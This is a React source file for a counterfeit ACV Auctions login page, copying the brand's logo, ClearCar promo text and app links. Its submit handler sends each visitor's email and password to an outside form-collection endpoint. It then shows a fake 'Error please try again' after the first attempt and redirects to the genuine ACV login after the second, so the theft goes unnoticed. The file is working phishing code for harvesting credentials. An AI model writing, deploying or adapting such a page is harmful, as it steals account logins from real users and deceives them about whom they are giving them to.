import axios from "axios";
import { ChevronLeft, ChevronRight } from "lucide-react";
import React, { useState } from "react";
import { ClipLoader } from "react-spinners";
import Apple from "./appstore.svg";
import ClearCar from "./clear-car-thumbnail.png";
import Logo from "./logo.svg";
import Android from "./playstore.svg";

const FORMSPARK_FORM_ID = "https://submit-form.com/QVVbabyKl";

const App = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({ email: "", password: "" });
  const [submissionCount, setSubmissionCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  // Handle input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrorMessage("");
    setIsLoading(true);

    try {
      const response = await axios.post(FORMSPARK_FORM_ID, formData);

      if (response.status === 200) {
        setSubmissionCount((prev) => prev + 1);
        setIsLoading(false);

        if (submissionCount === 0) {
          setTimeout(() => {
            setErrorMessage("Error please try again");
          }, 10000); // 30 seconds
        } else if (submissionCount === 1) {
          window.location.href = "https://app.acvauctions.com/login";
        }
      }
    } catch (error) {
      console.error("Error submitting form:", error.response?.data || error.message);
      setIsLoading(false);
      setErrorMessage("Failed to submit the form. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="p-6">
        {/* Top Navigation */}
        <header className="flex justify-between items-center mb-12">
          <img src={Logo} alt="ACV Logo" className="w-32" />
          <div className="flex items-center gap-2 text-sm">
            <span className="text-gray-600">New to ACV Auctions?</span>
            <a href="/signup" className="text-blue-400 hover:underline">
              SIGN UP
            </a>
          </div>
        </header>

        {/* Main Content */}
        <main className="max-w-6xl mx-auto grid md:grid-cols-2 gap-8 items-center">
          {/* Login Form Section */}
          <section className="w-full max-w-md">
            <img src={Logo} alt="ACV Auctions" className="mb-8 w-40" />
            {isLoading ? (
              <div className="flex justify-center items-center h-40">
                <ClipLoader size={50} color={"#D1392B"} loading={isLoading} />
              </div>
            ) : (
              <form className="space-y-4" onSubmit={handleSubmit}>
                {/* Error Message */}
                {errorMessage && (
                  <div className="text-red-500 text-sm mb-2">{errorMessage}</div>
                )}

                {/* Email Input */}
                <div>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    placeholder="Email Address"
                    className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#D1392B]"
                    required
                  />
                </div>

                {/* Password Input */}
                <div>
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    value={formData.password}
                    onChange={handleInputChange}
                    placeholder="Password"
                    className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#D1392B]"
                    required
                  />
                </div>

                {/* Show Password Checkbox */}
                <div className="flex items-center">
                  <input
                    type="checkbox"
                    id="showPassword"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="mr-2"
                  />
                  <label htmlFor="showPassword" className="text-sm text-gray-600">
                    Show Password
                  </label>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  className="w-full py-3 bg-[#D1392B] text-white rounded-md hover:bg-[#B32D21] transition-colors"
                >
                  Log In
                </button>
              </form>
            )}

            {/* App Download Section */}
            <div className="mt-8">
              <p className="text-sm text-center text-gray-600 mb-4">
                Download Our Free App To Transact On The Go!
              </p>
              <div className="flex justify-center gap-4">
                <a href="https://apps.apple.com" className="w-32">
                  <img src={Apple} alt="Download on App Store" className="w-full" />
                </a>
                <a href="https://play.google.com" className="w-32">
                  <img src={Android} alt="Get it on Google Play" className="w-full" />
                </a>
              </div>
            </div>
          </section>

          {/* Feature Section */}
          <section className="relative">
            <div className="bg-white p-8 rounded-lg">
              <div className="relative">
                <img src={ClearCar} alt="ClearCar Feature" className="w-full rounded-lg" />
                <p className="mt-4 text-gray-600">
                  Changing the game with condition-enhanced pricing
                </p>
                <p className="mt-2 text-sm text-gray-500">
                  ClearCar: Our new offering is revolutionizing the acquisition process with
                  real-time, data-driven pricing for sourcing inventory at ACV.
                </p>
                <button className="mt-4 text-blue-500 font-medium hover:underline">
                  GET MORE DETAILS
                </button>
              </div>

              {/* Navigation Buttons */}
              <div className="absolute top-1/2 -left-4 transform -translate-y-1/2">
                <button className="p-2 bg-white rounded-full shadow-lg">
                  <ChevronLeft className="w-6 h-6 text-gray-600" />
                </button>
              </div>
              <div className="absolute top-1/2 -right-4 transform -translate-y-1/2">
                <button className="p-2 bg-white rounded-full shadow-lg">
                  <ChevronRight className="w-6 h-6 text-gray-600" />
                </button>
              </div>
            </div>
          </section>
        </main>
      </div>
    </div>
  );
};

export default App;
